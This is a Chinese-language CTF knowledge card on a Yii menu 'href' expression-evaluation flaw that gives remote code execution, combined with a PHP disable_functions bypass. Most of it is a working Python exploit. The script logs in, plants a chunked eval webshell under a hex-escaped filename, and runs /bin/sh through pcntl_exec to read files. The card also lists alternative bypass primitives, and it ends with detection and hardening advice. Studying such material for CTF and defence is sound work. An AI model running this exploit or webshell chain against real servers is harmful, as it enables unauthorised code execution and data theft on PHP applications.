---
id: web-php-rce-yii-menu-href-expression-eval-disable-functions-bypass
title: Yii 菜单 href 表达式求值 + disable_functions 绕过：分段写 PHP 入口并用 pcntl_exec 读 flag
type: scenario
domain: web
path: web/php/rce
technique: yii-menu-href-eval-disable-functions-bypass
aliases:
- Yii 菜单 href 注入
- href 表达式求值
- disable_functions 绕过
- pcntl_exec
- fopen 写 webshell
- 十六进制文件名
tags:
- php
- yii
- code-injection
- disable-functions
- pcntl
- webshell
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:50:56+08:00'
  notes: 已对照原文 HrefBridge 一节核对：wechatguest 登录、GetMenujsonTree、Menuwechat[href] 表达式求值 '/x'.getcwd()、禁用 system/exec/passthru/shell_exec/popen/proc_open、fopen/fwrite+"q\x2ephp" 十六进制文件名分段写 <?=eval([0]);?>、pcntl_fork+pcntl_exec 读 /run/menu-admin/flag、flag 值均一致。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

当 Yii 应用的菜单管理把用户提交的 `href` 原样存储、运行时 `GetMenujsonTree` 兼容层却把它当 PHP 表达式求值（如 `'/x'.getcwd()`）时，就得到任意 PHP 代码执行；即使 `system/exec/passthru/shell_exec/popen/proc_open` 被禁用，仍可用 `fopen/fwrite` 配合双引号十六进制转义文件名分段写入 `<?=eval($_POST[0]);?>`，再用 `pcntl_fork+pcntl_exec` 启动 `/bin/sh` 读 flag。

## 原理

- **表达式求值**：菜单 `href` 本应是字符串路径，但运行时为了兼容历史数据，可能把 `'/x'.getcwd()` 这类内容当 PHP 表达式执行；攻击者通过 `Menuwechat[href]` 写入任意表达式，访问 `/wechat/default/GetMenujsonTree` 触发。
- **disable_functions 不是沙箱**：`disable_functions` 只禁用列出的函数，PHP 仍可调用未列出的函数。`fopen/fwrite` 可写文件，`pcntl_fork/pcntl_exec` 可启动进程；`file_put_contents`、`chr()`、`.php` 字面量可能被额外过滤，但可用等价写法绕过。
- **十六进制转义文件名**：双引号字符串中的 `\x2e` 是 `.`，`"q\x2ephp"` 生成 `q.php`，绕过对 `.php` 字面量的过滤；`chr()` 被禁用也不影响。
- **分段写入**：把 `<?=eval($_POST[0]);?>` 拆成 `<?=ev`、`al($_`、`POST[0]);?>` 三段，用 `fopen(...,'w')` + 追加模式写入，绕过长度/关键字过滤；`eval` 不在禁用列表（或未被过滤）。
- **命令执行**：`system/exec` 被禁用时，用 `pcntl_fork` 子进程调用 `pcntl_exec('/bin/sh', ['-c', 'cmd > /tmp/out'])`，父进程等待后 `file_get_contents('/tmp/out')` 读回结果。
- **为什么成立**：代码注入点 + 文件写 + 进程创建三者组合；`disable_functions` 只减少函数面，不能阻止文件/进程原语。

## 触发条件

- Yii 应用的菜单 `href` 可控，且运行时接口对 `href` 做表达式求值/包含。
- Web 进程对 webroot 可写；`fopen/fwrite` 可用；`eval` 未被禁用（或可用其他执行原语）。
- `disable_functions` 列出的函数不包含 `pcntl_fork/pcntl_exec`（或可用 `proc_open` 等替代）。
- 攻击者能登录菜单管理/有创建/更新菜单权限（本题提供 guest 账号）。
- 有可读的 flag 路径（本题 `/run/menu-admin/flag`）。

## 利用步骤

1. 登录应用，定位菜单管理接口（`/wechat/menuwechat/create|update`）与运行时菜单接口（`/wechat/default/GetMenujsonTree`）。
2. 创建测试菜单，把 `href` 设为 `'/x'.getcwd()`，访问运行时接口确认表达式求值（返回 `/x/.../webroot`）。
3. 用 `href` 执行 `fwrite(fopen("q\x2ephp","w"),"<?=ev")`，再追加 `"al($_"`、`"POST[0]);?>"`；注意过滤规则，必要时拆分更多段。
4. 请求 `/q.php`，POST 参数 `0=print "OK";` 验证 webshell。
5. 用 `pcntl_fork+pcntl_exec` 执行 `cat /run/menu-admin/flag > /tmp/wp_out`，再用 `file_get_contents('/tmp/wp_out')` 读回；本题得到 `flag{ffbacb12-c2ac-422c-8afd-992125f03259}`。
6. 清理写入的 `q.php` 与测试菜单。

## PoC

```python
import re
import requests

BASE = "http://target:34487"
s = requests.Session()

def login():
    s.get(BASE + "/wechat/default/login", timeout=12)
    s.post(BASE + "/wechat/default/login", data={
        "LoginForm[username]": "wechatguest",
        "LoginForm[password]": "wechatguest2026",
        "yt0": "登录",
    }, timeout=12)

def create_menu():
    data = {
        "Menuwechat[text]": "zztest",
        "Menuwechat[type]": "2",
        "Menuwechat[parentid]": "1",
        "Menuwechat[css]": "",
        "Menuwechat[collapsed]": "0",
        "Menuwechat[href]": "/wechat/default/welcome",
        "Menuwechat[closeable]": "1",
    }
    s.post(BASE + "/wechat/menuwechat/create", data=data, timeout=12)
    tree = s.get(BASE + "/wechat/menuwechat/load", timeout=12).json()
    for item in tree["data"][0]["children"]:
        if item["text"] == "zztest":
            return item["id"]
    raise RuntimeError("menu id not found")

def set_href(menu_id, href):
    data = {
        "Menuwechat[text]": "zztest",
        "Menuwechat[type]": "2",
        "Menuwechat[parentid]": "1",
        "Menuwechat[css]": "",
        "Menuwechat[collapsed]": "0",
        "Menuwechat[href]": href,
        "Menuwechat[closeable]": "1",
    }
    s.post(BASE + f"/wechat/menuwechat/update?id={menu_id}", data=data, timeout=12)

def eval_href(menu_id, expr):
    set_href(menu_id, "'/x'." + expr)
    r = s.get(BASE + "/wechat/default/GetMenujsonTree", timeout=12)
    for item in r.json()[0]["children"]:
        if item["id"] == str(menu_id):
            return item["href"]

def write_shell(menu_id):
    name = '"q\\x2ephp"'
    for mode, chunk in [("w", "<?=ev"), ("a", "al($_"), ("a", "POST[0]);?>")]:
        eval_href(menu_id, f"fwrite(fopen({name},'{mode}'),'{chunk}')")
    r = s.post(BASE + "/q.php", data={"0": 'print "OK";'}, timeout=12)
    assert r.text == "OK"

def php(code):
    return s.post(BASE + "/q.php", data={"0": code}, timeout=20).text

def sh(cmd):
    out = "/tmp/wp_out"
    full = f"({cmd}) >{out} 2>&1"
    code = (
        '$p=pcntl_fork();'
        'if($p==0){pcntl_exec("/bin/sh",["-c",' + repr(full) + "]); exit;}"
        f'else {{usleep(700000); print file_get_contents("{out}");}}'
    )
    return php(code)

login()
menu_id = create_menu()
print(eval_href(menu_id, "getcwd()"))
write_shell(menu_id)
print(sh("cat /run/menu-admin/flag").strip())
```

## 变体与关联

- **变体（表达式注入点）**：菜单 href、排序字段、模板变量、配置项、SQL 片段；凡是“运行时求值/包含”的用户输入都可审计。
- **变体（写文件）**：`fopen/fwrite`、`file_put_contents`、`error_log`、`session`、`upload`；过滤 `.php` 可用 `\x2e`、`\.`、大小写、`.pht`/`.phtml`。
- **变体（执行）**：`pcntl_exec`、`proc_open`、`popen`、`mail`、`putenv`+`LD_PRELOAD`、`FFI`、`imap_open` 等；按禁用列表选择。
- **关联卡片**：[[web-php-rce-disable-functions-ld-preload]]（LD_PRELOAD 绕过）、[[web-php-rce-uaf-memory-corruption-disable-functions-bypass]]（UAF 绕过）、[[web-php-open-basedir-bypass-classic-methods]]（open_basedir 绕过）。
- **边界**：`eval` 被禁用、webroot 只读、`pcntl_*` 被禁用、SELinux/AppArmor 限制时需换原语；表达式求值可能只对特定字符集生效。

## 检测与防御

- **不要 eval 用户输入**：菜单/配置字段只做字符串白名单/路由校验，不做表达式求值；历史数据迁移时不要保留 eval 兼容层。
- **disable_functions 加固**：同时禁用 `pcntl_*`、`proc_open`、`popen`、`fopen` 写模式等；使用 `open_basedir`、只读 webroot、SELinux/AppArmor。
- **权限**：菜单管理需强认证/授权；Web 进程最小权限；flag 文件不可被 Web 进程读取（或放到独立服务）。
- **检测**：审计 `href` 中的 `.`/函数调用/引号；WAF 规则覆盖 `getcwd()`、`fwrite(fopen(`、`pcntl_exec`；监控 webroot 新增 PHP 文件与异常子进程。
